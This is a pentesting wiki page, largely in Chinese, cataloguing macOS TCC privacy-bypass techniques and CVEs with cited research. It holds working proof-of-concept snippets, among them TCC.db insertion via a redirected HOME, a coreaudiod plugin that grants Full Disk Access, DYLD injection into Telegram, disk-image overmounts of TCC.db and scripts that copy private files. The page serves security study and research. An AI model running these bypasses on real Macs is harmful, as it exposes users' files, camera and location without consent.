# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## 按功能分类

### Write Bypass

这并不是一种 bypass，而只是 TCC 的工作方式：**它不会防止写入**。如果 Terminal **没有权限读取用户的 Desktop，它仍然可以向其中写入**：
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** is added to the new **file** to give the **creators app** 访问读取它的权限。

### TCC ClickJacking

可以在 **TCC prompt 上方放置一个窗口**，诱使用户在不知情的情况下**接受**它。你可以在 [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** 中找到 PoC。**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

攻击者可以在 **`Info.plist`** 中使用任意名称（例如 Finder、Google Chrome...）**创建 apps**，并让其请求访问某些受 TCC 保护的位置。用户会以为是合法 application 在请求此访问权限。\
此外，还可以**将合法 app 从 Dock 中移除，并将 fake app 放入其中**。因此，当用户点击 fake app（它可以使用相同的图标）时，它可以调用合法 app、请求 TCC permissions 并执行 malware，使用户相信是合法 app 请求了该访问权限。

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

更多信息和 PoC：


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

默认情况下，通过 **SSH 进行的访问曾拥有 "Full Disk Access"**。要禁用此权限，需要将其列出但设为 disabled（从列表中移除并不会移除这些 privileges）：<sup>[2]</sup>

![TCC Request by arbitrary name - SSH Bypass: 默认情况下，通过 SSH 进行的访问曾拥有 "Full Disk Access"。要禁用此权限，需要将其列出但设为 disabled（从列表中移除并不会移除这些...](<../../../../../images/image (1077).png>)

以下是一些 **malwares 成功绕过此保护**的示例：

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[11]</sup>

> [!CAUTION]
> 注意，现在要启用 SSH，必须拥有 **Full Disk Access**

### Handle extensions - CVE-2022-26767

属性 **`com.apple.macl`** 会被赋予文件，以授予**特定 application 读取该文件的权限**。当用户将文件**拖放**到 app 上，或**双击**文件以使用**默认 application** 打开时，会设置此属性。

因此，用户可以**注册一个 malicious app** 来处理所有扩展名，并调用 Launch Services **打开**任意文件（这样 malicious file 就会获得读取该文件的权限）。

### iCloud

通过 entitlement **`com.apple.private.icloud-account-access`**，可以与 **`com.apple.iCloudHelper`** XPC service 通信，而该 service 将**提供 iCloud tokens**。

**iMovie** 和 **Garageband** 曾拥有此 entitlement 以及其他可实现相关功能的 entitlement。

有关利用该 entitlement **获取 icloud tokens** 的 exploit 的更多**信息**，请查看演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[12]</sup>

### kTCCServiceAppleEvents / Automation

拥有 **`kTCCServiceAppleEvents`** permission 的 app 将能够**控制其他 Apps**。这意味着它可能能够**滥用其他 Apps 获得的 permissions**。

有关 Apple Scripts 的更多信息，请查看：


{{#ref}}
macos-apple-scripts.md
{{#endref}}

例如，如果某个 App 拥有针对 **`iTerm`** 的 **Automation permission**，在此示例中，**`Terminal`** 就拥有对 iTerm 的访问权限：

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

没有 FDA 的 Terminal 可以调用拥有 FDA 的 iTerm，并利用它执行操作：
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### 通过 Finder

或者，如果某个 App 通过 Finder 获得了访问权限，它可以运行类似这样的脚本：
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## 按 App 行为

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

用户态 **tccd daemon** 使用 **`HOME`** **env** 变量访问 TCC 用户数据库：**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

根据 [此 Stack Exchange 帖子](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)，并且由于 TCC daemon 通过当前用户域中的 **`launchd`** 运行，因此可以**控制传递给它的所有环境变量**。\
因此，**攻击者可以在** **`launchctl`** **中设置** **`$HOME` 环境**变量，使其指向一个**受控** **目录**，**重启** **TCC** daemon，然后**直接修改 TCC 数据库**，从而在完全不提示终端用户的情况下，为自身授予所有可用的 TCC 权限。<sup>[1]</sup>\
PoC：
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes 可以访问受 TCC 保护的位置，但创建 note 时，该 note 会被**创建在非受保护的位置**。因此，你可以让 Notes 将受保护的文件复制到一个 note 中（也就是复制到非受保护的位置），然后访问该文件：

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

二进制文件 `/usr/libexec/lsd` 通过库 `libsecurity_translocate` 获得了 entitlement `com.apple.private.nullfs_allow`，允许其创建 **nullfs** mount；同时还拥有带有 **`kTCCServiceSystemPolicyAllFiles`** 的 entitlement `com.apple.private.tcc.allow`，因此可以访问所有文件。

可以为 "Library" 添加 quarantine attribute，调用 **`com.apple.security.translocation`** XPC service，之后它会将 Library 映射到 **`$TMPDIR/AppTranslocation/d/d/Library`**，从而可以**访问** Library 中的所有文档。

### CVE-2024-44131 - FileProvider symlink race

将文件操作交给**特权 helper** 的应用（这里是 **`fileproviderd`** / **`Files.app`**）会**代表用户**复制或移动项目，因此复制操作使用的是 helper 的权限，而不是调用者的权限。

Jamf Threat Labs 证明，在操作执行前进行的 symlink 验证可以被 **race**：攻击者不是将 symlink 放在**最后**一个路径组件上（该组件会被检查），而是在复制已经开始后，替换路径中的某个**中间**目录。随后，特权 helper 会跟随攻击者控制的 link，在**完全不显示 prompt** 的情况下读取或写入受 TCC 保护的位置。<sup>[7]</sup>

路径中没有通过随机 UUID 进行保护的目录（例如 `~/Library/Mobile Documents/com~apple~CloudDocs`）是最容易攻击的目标，因为攻击者可以预测用于 race 的完整路径。

> [!TIP]
> 这是需要寻找的通用模式：**任何会多次解析路径的特权进程**（check-then-use，或分别解析 source 和 destination 的 `rename()`/`copyfile()`）都可能在通过替换路径中间的目录时被 race。只有 `O_NOFOLLOW_ANY`、对已打开目录 FD 使用 `openat()`，或 `realpath()` + 重新验证，才能真正关闭这个窗口。

更多信息请参阅 [**Jamf Threat Labs 的 writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)。<sup>[7]</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` 可以通过 `SQLITE_ENABLE_SQLLOG` 构建，该功能会添加由环境变量驱动的 logging hook（[upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)）：<sup>[8]</sup>

- **`SQLITE_SQLLOG_DIR=path`** – 对于**每个被打开的 database**，都会将**数据库文件的副本**以及 SQL statements 的 log 写入 `path`（该目录必须已经存在）。
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – 每次打开或 attach DB 时都创建**全新的副本**，而不是复用已有副本。
- **`SQLITE_SQLLOG_CONDITIONAL`** – 仅当主 DB 旁边存在 `<database>-sqllog` 文件时，才对 connection 进行 logging。

如果你可以将该变量注入一个拥有 **FDA** 且会打开 SQLite databases 的进程，它就会将那些受保护的 databases **复制**到你控制的目录中。由于 destination filename 源自攻击者控制的数据，在 destination 处预先植入一个 **symlink**，即可将同一 primitive 转化为使用目标进程权限进行的**任意文件写入**。

### **SQLITE_AUTO_TRACE**

如果设置了环境变量 **`SQLITE_AUTO_TRACE`**，库 **`libsqlite3.dylib`** 就会开始对所有 SQL queries 进行 **logging**。许多应用都使用了这个库，因此可以记录它们的所有 SQLite queries。

多个 Apple 应用使用该库访问受 TCC 保护的信息。
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Hunting for env-var driven file writes

前两个条目都是同一种通用 technique 的实例，值得继续寻找更多类似情况：**加载到 TCC-privileged apps 中的 frameworks 通常会暴露 debug/logging 环境变量，使进程在 caller-controlled path 创建文件**。

查找流程：

1. 选择一个具有 FDA 或其他高价值 TCC permission 的目标（`Music`、`TV`、`Terminal`、MDM agents 等），并列出它链接的 frameworks（`otool -L`、`vmmap`）。
2. 在这些 frameworks 中 grep `getenv` 字符串：`strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`。
3. 通过 `launchctl setenv NAME /path/you/control` 设置候选变量，启动 app，并使用 `fs_usage -w -f filesys <pid>` 或 `sudo fs_usage | grep <path>` 监视其在文件系统上的行为。
4. 如果进程在你的目录中**创建或重命名**文件，你就获得了一个 write primitive：将目标指向 symlink（或像上面的 CVE-2024-44131 一样，对中间目录发起 race），将其重定向到 `~/Library/Application Support/com.apple.TCC/TCC.db`。

> [!TIP]
> 有两点会限制这种方法。第一，除非 hardened-runtime binary 携带 [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement（“一个 Boolean value，表示 app 是否可能受到 dynamic linker environment variables 的影响；你可以使用它向 app 的 process 注入 code”），否则 **`DYLD_*` variables 会被忽略**——另请参阅 [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)。第二，Apple 会在 individual framework debug variables 被报告后移除它们，因此某个变量在一个 macOS release 中有效，下一版通常就会消失。如果设置某个变量后 app 静默拒绝启动，请将该变量视为已被过滤。

关于使用 linker variables 实现等效 trick，请参阅 [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md)。

### Apple Remote Desktop

作为 root，你可以启用此 service，而 **ARD agent 将拥有 full disk access**，之后用户可以滥用它来复制一个新的 **TCC user database**。

## By **NFSHomeDirectory**

TCC 使用用户 HOME folder 中的 database 来控制对该用户特定资源的访问，路径为 **$HOME/Library/Application Support/com.apple.TCC/TCC.db**。\
因此，如果用户能够使用指向**不同 folder** 的 `$HOME` env variable 重启 TCC，就可以在 **/Library/Application Support/com.apple.TCC/TCC.db** 中创建新的 TCC database，并诱骗 TCC 向任意 app 授予任意 TCC permission。

> [!TIP]
> 请注意，Apple 使用用户 profile 中 **`NFSHomeDirectory`** attribute 存储的设置作为 **`$HOME`** 的值。因此，如果你 compromise 了一个具有修改此值权限（**`kTCCServiceSystemPolicySysAdminFiles`**）的 application，就可以使用此选项构造一个 TCC bypass。

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**第一个 POC** 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 和 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 修改用户的 **HOME** folder。

1. 获取目标 app 的 _csreq_ blob。
2. 使用所需 access 和 _csreq_ blob 部署一个伪造的 _TCC.db_ 文件。
3. 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 导出用户的 Directory Services entry。
4. 修改 Directory Services entry，以更改用户的 home directory。
5. 使用 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 导入修改后的 Directory Services entry。
6. 停止用户的 _tccd_ 并重启该 process。

第二个 POC 使用了具有 `com.apple.private.tcc.allow`（值为 `kTCCServiceSystemPolicySysAdminFiles`）的 **`/usr/libexec/configd`**。\
可以使用 **`-t`** option 运行 **`configd`**，攻击者能够指定要加载的 **custom Bundle**。因此，该 exploit 使用 **`configd` code injection** 替代了通过 **`dsexport`** 和 **`dsimport`** 修改用户 home directory 的方法。

更多信息请参阅 [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)。<sup>[13]</sup>

## By process injection

有多种 technique 可以向 process 内部注入 code 并滥用其 TCC privileges：


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

此外，最常见的、用于 bypass TCC 的 process injection 是通过 **plugins (load library)** 实现的。\
Plugins 是额外的 code，通常以 libraries 或 plist 的形式存在，会被 **main application 加载**，并在其 context 下执行。因此，如果 main application 可以访问 TCC restricted files（通过已授予的 permissions 或 entitlements），则 **custom code 也将拥有这些权限**。

### CVE-2020-27937 - Directory Utility

application `/System/Library/CoreServices/Applications/Directory Utility.app` 具有 **`kTCCServiceSystemPolicySysAdminFiles`** entitlement，会加载扩展名为 **`.daplug`** 的 plugins，且**没有启用 hardened** runtime。

为了 weaponize 此 CVE，需要（滥用前述 entitlement）修改 **`NFSHomeDirectory`**，从而能够**接管用户的 TCC database** 以 bypass TCC。

更多信息请参阅 [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)。<sup>[14]</sup>

### CVE-2020-29621 - Coreaudiod

binary **`/usr/sbin/coreaudiod`** 具有 `com.apple.security.cs.disable-library-validation` 和 `com.apple.private.tcc.manager` entitlements。前者**允许 code injection**，后者使其能够**管理 TCC**。

此 binary 允许从 `/Library/Audio/Plug-Ins/HAL` folder 加载 **third party plug-ins**。因此，可以使用以下 PoC **加载 plugin 并滥用 TCC permissions**：<sup>[15]</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
更多信息请查看[**原始报告**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)。<sup>[15]</sup>

### Device Abstraction Layer (DAL) Plug-Ins

通过 Core Media I/O 打开摄像头流的系统应用（具有 **`kTCCServiceCamera`** 的应用）会在进程中加载位于 `/Library/CoreMediaIO/Plug-Ins/DAL` 的这些插件（不受 SIP 限制）。

只需将一个带有通用 **constructor** 的库存放在那里，即可实现 **注入代码**。

多个 Apple 应用都存在此漏洞。

### Firefox

Firefox 应用具有 `com.apple.security.cs.disable-library-validation` 和 `com.apple.security.cs.allow-dyld-environment-variables` entitlements：<sup>[16]</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
有关如何轻松利用此漏洞的更多信息，请查看[**原始报告**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。<sup>[16]</sup>

### CVE-2020-10006

二进制文件 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` 具有 **`com.apple.private.tcc.allow`** 和 **`com.apple.security.get-task-allow`** entitlements，因此可以向该进程中注入代码并使用其 TCC 权限。

### CVE-2023-26818 - Telegram

Telegram 具有 **`com.apple.security.cs.allow-dyld-environment-variables`** 和 **`com.apple.security.cs.disable-library-validation`** entitlements，因此可以滥用它来**获取其权限**，例如使用摄像头进行录制。你可以在[**writeup 中找到 payload**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。<sup>[17]</sup>

注意，为了使用 env variable 加载 library，创建了一个**自定义 plist** 来注入该 library，并使用 **`launchctl`** 启动它：<sup>[17]</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## 通过 open 调用

即使处于 sandboxed 状态，也可以调用 **`open`**

### 终端脚本

至少在技术人员使用的计算机上，为终端授予 **Full Disk Access (FDA)** 很常见。也可以使用它调用 **`.terminal`** 脚本。

**`.terminal`** 脚本是类似于以下文件的 plist 文件，其中要执行的命令位于 **`CommandString`** 键中：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
应用程序可以在诸如 /tmp 的位置写入终端脚本，并使用类似以下的命令启动它：
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**任何用户**（甚至是未受特权的用户）都可以创建并挂载一个 Time Machine 快照，并**访问该快照中的所有文件**。\
唯一需要的**特权**是所使用的应用程序（例如 `Terminal`）必须拥有 **Full Disk Access**（FDA）权限（`kTCCServiceSystemPolicyAllfiles`），而该权限需要由管理员授予。<sup>[2]</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
更详细的说明可以[**在原始报告中找到**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**

### CVE-2021-1784 & CVE-2021-30808 - 覆盖挂载 TCC 文件

即使 TCC DB 文件受到保护，也可以**在该目录上覆盖挂载**一个新的 TCC.db 文件：
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
查看 [**原始 writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) 了解 **完整 exploit**。

### CVE-2024-40855

如 [原始 writeup](https://www.kandji.io/blog/macos-audit-story-part2) 中所述，该 CVE 利用了 `diskarbitrationd`。<sup>[18]</sup>

公共 `DiskArbitration` framework 中的 `DADiskMountWithArgumentsCommon` 函数负责执行 security checks。不过，可以通过直接调用 `diskarbitrationd` 来绕过这些检查，从而在路径中使用 `../` 元素和 symlinks。

这使攻击者能够在任意位置执行 arbitrary mounts，包括覆盖 TCC database。这是因为 `diskarbitrationd` 具有 `com.apple.private.security.storage-exempt.heritable` entitlement。

### asr

**`/usr/sbin/asr`** 工具可以复制整个磁盘，并将其 mount 到其他位置，从而绕过 TCC protections。

### CVE-2022-22655 - Location Services

Location Services 并不像其他 services 那样存储在 TCC database 中。它们由 `locationd` 管理，后者在 **`/var/db/locationd/clients.plist`** 中维护自己的 allow-list：<sup>[5]</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
每个条目都以客户端（bundle ID 或可执行文件路径）为键，并包含诸如 `Authorized`、`BundleId`、`Executable` 和 `Registered` 等字段。

`clients.plist` 文件本身受 Sandbox/TCC 保护，即使以 root 身份也无法编辑——但 **`/var/db/locationd/` 目录并未受到挂载保护**。因此，以 root 身份运行的攻击者可以创建一个包含自定义 `clients.plist` 的磁盘映像（将其二进制文件标记为 `Authorized`），将其挂载到该目录上方，然后重启 `locationd`，使伪造的 allow-list 生效。<sup>[5]</sup>

> [!TIP]
> 这与上文的 `hdiutil`/`mount` TCC bypasses 使用的是相同模式：受保护的是*文件*，而不是其所在的*目录*，因此可以替换整个目录，而不是替换文件。

## 通过 startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## 通过 grep

在一些情况下，文件会将 emails、电话号码、messages 等敏感信息存储在未受保护的位置（这在 Apple 看来属于 vulnerability）。

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

这现在已经不起作用了，但[**过去确实可以**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**：**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

另一种使用 [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) 的方法：<sup>[19]</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [10] [The Eclectic Light Company - Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [11] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
